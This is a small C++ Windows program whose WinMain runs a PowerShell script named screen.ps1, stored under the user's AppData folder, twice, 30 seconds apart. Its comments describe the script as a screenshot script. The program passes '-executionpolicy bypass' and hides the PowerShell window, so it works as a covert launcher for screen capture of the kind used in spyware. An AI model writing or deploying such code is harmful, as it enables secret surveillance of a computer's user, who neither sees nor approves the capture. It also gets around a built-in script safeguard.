/*
	This program launches the script
*/

#include <iostream>
#include <windows.h>

#define PARAM_LEN   512

using namespace std;

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
{
	char appdata[MAX_PATH];
	char param[PARAM_LEN] = "-executionpolicy bypass -Command \"& '";

	// get appdata path
	GetEnvironmentVariable("appdata", appdata, MAX_PATH);

	// concatenate path and param
	strcat_s(param, appdata);
	strcat_s(param, "\\VierAugen\\screen.ps1'\"");

	// launch screenshot script
	ShellExecute(NULL, "open", "powershell.exe", param, NULL, SW_HIDE);

	// wait 30sec
	Sleep(30000);

	// launch screenshot script again
	ShellExecute(NULL, "open", "powershell.exe", param, NULL, SW_HIDE);

	return 0;
}
